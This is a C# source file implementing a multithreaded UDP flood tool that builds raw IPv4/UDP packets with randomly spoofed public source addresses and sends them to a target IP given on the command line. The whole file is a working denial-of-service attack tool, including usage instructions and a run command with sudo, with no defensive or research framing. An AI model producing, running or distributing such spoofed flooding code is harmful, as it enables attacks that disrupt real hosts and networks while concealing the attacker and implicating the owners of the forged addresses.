
namespace TestOCSP
{
    // Structures to help with packet construction (approximate C# equivalents)
    // Note: C# doesn't allow direct struct layout to match C bitfields easily,
    //       so we'll manage byte offsets manually.

    // struct iphdr (simplified for key fields used in C code)
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct iphdr_cs
    {
        public byte version_ihl; // Version (4 bits) and Internet Header Length (4 bits)
        public byte tos;         // Type of Service
        public ushort tot_len;   // Total Length
        public ushort id;        // Identification
        public ushort frag_off;  // Fragment Offset
        public byte ttl;         // Time to Live
        public byte protocol;    // Protocol
        public ushort check;     // Header Checksum
        public uint saddr;       // Source Address
        public uint daddr;       // Destination Address
    }

    // struct udphdr
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct udphdr_cs
    {
        public ushort source; // Source Port
        public ushort dest;   // Destination Port
        public ushort len;    // Length
        public ushort check;  // Checksum
    }

    // struct pseudo_header
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct pseudo_header_cs
    {
        public uint source_address;      // Source IP Address
        public uint destination_address; // Destination IP Address
        public byte placeholder;         // Placeholder (always 0)
        public byte protocol;            // Protocol (UDP = 17)
        public ushort udp_length;        // UDP Length
    }


    public class UdpFloodTool
    {
        static int maxThreads;
        static System.Net.Sockets.Socket rawSocket;
        static string targetIp;
        static string payload;
        static bool keepSending = true;
        static System.Threading.Mutex sendMutex = new System.Threading.Mutex(); // Mutex for potentially shared resources during send (though less critical with packet per thread)
        static System.Threading.CancellationTokenSource cancellationTokenSource = new System.Threading.CancellationTokenSource();


        // sudo dotnet ./UdpFloodTool.dll <target_ip> <number_of_threads> <payload>

        // Operating System Differences (Raw Sockets and Spoofing): 
        // The most significant difference is the behavior of raw sockets, particularly on Windows. 
        // Windows has limitations on sending raw UDP packets with spoofed source IP addresses for security reasons. 
        // This C# code, like the C code, attempts to spoof the source IP by crafting the IP header, 
        // but this might not work on all Windows versions or configurations due to built-in protections. 
        // The C code is likely intended for Linux/Unix environments where this is generally permitted.

        /// <summary>
        /// provides functionality for crafting and sending raw UDP packets with spoofed source IPs using multiple threads,
        /// </summary>
        /// <param name="args"></param>
        public static void Test(string[] args)
        {
            System.Console.WriteLine("UDP Flood Tool (C#)");

            if (args.Length < 3)
            {
                System.Console.WriteLine("Usage: UdpFloodTool <target_ip> <number_of_threads> <payload>");
                return;
            }

            targetIp = args[0];
            if (!System.Net.IPAddress.TryParse(targetIp, out _))
            {
                System.Console.WriteLine("Invalid target IP address.");
                return;
            }

            if (!int.TryParse(args[1], out maxThreads) || maxThreads <= 0)
            {
                System.Console.WriteLine("Invalid number of threads. Please provide a positive integer.");
                return;
            }

            payload = args[2];

            // Set up Ctrl+C handler
            System.Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true; // Prevent the application from terminating immediately
                System.Console.WriteLine("\nCtrl+C detected. Shutting down...");
                keepSending = false;
                cancellationTokenSource.Cancel();
            };

            try
            {
                // Create a raw socket
                // Note: Creating raw sockets and sending custom headers requires
                // elevated privileges and may have limitations on Windows compared to Linux/Unix.
                rawSocket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Raw, System.Net.Sockets.ProtocolType.Udp);

                // This option is needed to include the IP header in the data sent
                // Note: This might require administrative privileges.
                rawSocket.SetSocketOption(System.Net.Sockets.SocketOptionLevel.IP, System.Net.Sockets.SocketOptionName.HeaderIncluded, true);

                System.Console.WriteLine("Raw socket created.");

                System.Threading.Tasks.Task[] floodTasks = new System.Threading.Tasks.Task[maxThreads];
                for (int i = 0; i < maxThreads; i++)
                {
                    floodTasks[i] = System.Threading.Tasks.Task.Factory.StartNew(() => UdpFloodTask(cancellationTokenSource.Token), cancellationTokenSource.Token);
                } // Next i 

                // Wait for all tasks to complete or for cancellation
                System.Threading.Tasks.Task.WaitAll(floodTasks);

            } // End Try 
            catch (System.Net.Sockets.SocketException ex)
            {
                System.Console.WriteLine($"Socket error: {ex.Message}");
                System.Console.WriteLine("Ensure you have sufficient privileges to create raw sockets (run as administrator).");
            } // End Catch 
            catch (System.Exception ex)
            {
                System.Console.WriteLine($"An error occurred: {ex.Message}");
            } // End Catch 
            finally
            {
                // Clean up
                if (rawSocket != null)
                {
                    rawSocket.Close();
                    System.Console.WriteLine("Socket closed.");
                }
                sendMutex.Dispose();
                cancellationTokenSource.Dispose();
                System.Console.WriteLine("Resources released. Exiting.");
            } // End Finally 

        } // End Sub Test 

        static async System.Threading.Tasks.Task UdpFloodTask(System.Threading.CancellationToken cancellationToken)
        {
            System.Random rand = new System.Random();
            byte[] dataBytes = System.Text.Encoding.ASCII.GetBytes(payload);
            int udpHeaderSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(udphdr_cs));
            int ipHeaderSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(iphdr_cs));
            int totalPacketSize = ipHeaderSize + udpHeaderSize + dataBytes.Length;
            byte[] datagram = new byte[totalPacketSize];

            while (keepSending && !cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Generate random source IP and port
                    string sourceIp = GenerateRandomIp(rand);
                    int sourcePort = rand.Next(1024, 65536); // Random source port (avoid well-known ports)
                    int destinationPort = rand.Next(0, 65536); // Random destination port

                    // IP Header Construction
                    System.Array.Clear(datagram, 0, datagram.Length); // Clear the buffer for the new packet

                    // Version (4 bits) + IHL (4 bits)
                    datagram[0] = (byte)((4 << 4) | (ipHeaderSize / 4));
                    // DSCP (6 bits) + ECN (2 bits) - Simplified TOS
                    datagram[1] = 0;
                    // Total Length
                    ushort totalLength = (ushort)totalPacketSize;
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(totalLength)), 0, datagram, 2, 2);
                    // Identification (random)
                    ushort identification = (ushort)rand.Next(0, 65536);
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(identification)), 0, datagram, 4, 2);
                    // Flags (3 bits) + Fragment Offset (13 bits)
                    datagram[6] = 0;
                    datagram[7] = 0;
                    // Time to Live
                    datagram[8] = 255;
                    // Protocol (UDP = 17)
                    datagram[9] = (byte)System.Net.Sockets.ProtocolType.Udp;
                    // Header Checksum (calculated later)
                    datagram[10] = 0;
                    datagram[11] = 0;
                    // Source IP Address
                    uint sourceIpUint = System.BitConverter.ToUInt32(System.Net.IPAddress.Parse(sourceIp).GetAddressBytes(), 0);
                    System.Array.Copy(System.BitConverter.GetBytes(sourceIpUint), 0, datagram, 12, 4);
                    // Destination IP Address
                    uint targetIpUint = System.BitConverter.ToUInt32(System.Net.IPAddress.Parse(targetIp).GetAddressBytes(), 0);
                    System.Array.Copy(System.BitConverter.GetBytes(targetIpUint), 0, datagram, 16, 4);

                    // Calculate IP Header Checksum
                    ushort ipChecksum = CalculateChecksum(datagram, 0, ipHeaderSize);
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(ipChecksum)), 0, datagram, 10, 2);


                    // UDP Header Construction
                    // Source Port
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder((ushort)sourcePort)), 0, datagram, ipHeaderSize, 2);
                    // Destination Port
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder((ushort)destinationPort)), 0, datagram, ipHeaderSize + 2, 2);
                    // Length (UDP header + data)
                    ushort udpLength = (ushort)(udpHeaderSize + dataBytes.Length);
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(udpLength)), 0, datagram, ipHeaderSize + 4, 2);
                    // Checksum (calculated later)
                    datagram[ipHeaderSize + 6] = 0;
                    datagram[ipHeaderSize + 7] = 0;

                    // Copy data payload
                    System.Array.Copy(dataBytes, 0, datagram, ipHeaderSize + udpHeaderSize, dataBytes.Length);

                    // UDP Checksum Calculation (requires pseudo-header)
                    int pseudoHeaderSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(pseudo_header_cs));
                    byte[] pseudoPacket = new byte[pseudoHeaderSize + udpLength];

                    // Pseudo-header Construction
                    System.Array.Copy(System.BitConverter.GetBytes(sourceIpUint), 0, pseudoPacket, 0, 4);
                    System.Array.Copy(System.BitConverter.GetBytes(targetIpUint), 0, pseudoPacket, 4, 4);
                    pseudoPacket[8] = 0; // Placeholder
                    pseudoPacket[9] = (byte)System.Net.Sockets.ProtocolType.Udp;
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(udpLength)), 0, pseudoPacket, 10, 2);

                    // Copy UDP header and data
                    System.Array.Copy(datagram, ipHeaderSize, pseudoPacket, pseudoHeaderSize, udpLength);

                    // Calculate UDP Checksum
                    ushort udpChecksum = CalculateChecksum(pseudoPacket, 0, pseudoPacket.Length);
                    // If the checksum is 0, it should be transmitted as 0xFFFF (optional, but good practice)
                    if (udpChecksum == 0)
                    {
                        udpChecksum = 0xFFFF;
                    }
                    System.Array.Copy(System.BitConverter.GetBytes(System.Net.IPAddress.HostToNetworkOrder(udpChecksum)), 0, datagram, ipHeaderSize + 6, 2);

                    // Send the packet
                    // Use SendTo with an IPEndPoint for the target
                    System.Net.EndPoint targetEndPoint = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(targetIp), destinationPort);

                    // Although SendTo is used with a specific endpoint, for raw sockets with IP_HDRINCL,
                    // the destination IP in the crafted header is what matters for routing.
                    // The endpoint here is mainly for the socket's SendTo method signature.
                    rawSocket.SendTo(datagram, targetEndPoint);


                    // Console.WriteLine($"Sent packet to {targetIp}:{destinationPort} with spoofed source {sourceIp}:{sourcePort}");

                    // Add a small delay to avoid overwhelming the network or CPU
                    await System.Threading.Tasks.Task.Delay(1, cancellationToken);
                } // End Try 
                catch (System.OperationCanceledException)
                {
                    // Task was cancelled
                    break;
                } // End Catch 
                catch (System.Exception ex)
                {
                    System.Console.WriteLine($"Error in flood task: {ex.Message}");
                    // Continue sending despite errors in one thread
                } // End Catch 

            } // Whend 

        } // End Task UdpFloodTask 


        // Calculates the one's complement checksum
        static ushort CalculateChecksum(byte[] buffer, int offset, int length)
        {
            ulong sum = 0;
            int index = offset;
            while (length > 1)
            {
                sum += System.BitConverter.ToUInt16(buffer, index);
                index += 2;
                length -= 2;
            }

            if (length > 0)
            {
                sum += buffer[index];
            }

            sum = (sum >> 16) + (sum & 0xffff);
            sum += (sum >> 16);

            return (ushort)~sum;
        } // End Function CalculateChecksum 


        // Generates a random IP address string (excluding 0.0.0.0 and multicast ranges, simplified)
        static string GenerateRandomIp(System.Random rand)
        {
            byte[] ipBytes = new byte[4];
            rand.NextBytes(ipBytes);

            // Avoid loopback (127.0.0.0/8), multicast (224.0.0.0/4),
            // broadcast (255.255.255.255), and private ranges (simplified check)
            // This is a basic exclusion and not exhaustive.
            while (ipBytes[0] == 127 || ipBytes[0] >= 224 ||
                   (ipBytes[0] == 10) ||
                   (ipBytes[0] == 172 && ipBytes[1] >= 16 && ipBytes[1] <= 31) ||
                   (ipBytes[0] == 192 && ipBytes[1] == 168) ||
                   (ipBytes[0] == 0) || (ipBytes[0] == 255 && ipBytes[1] == 255 && ipBytes[2] == 255 && ipBytes[3] == 255))
            {
                rand.NextBytes(ipBytes);
            } // Whend 

            return new System.Net.IPAddress(ipBytes).ToString();
        } // End Function GenerateRandomIp 


    } // End Class UdpFloodTool 


} // End Namespace 
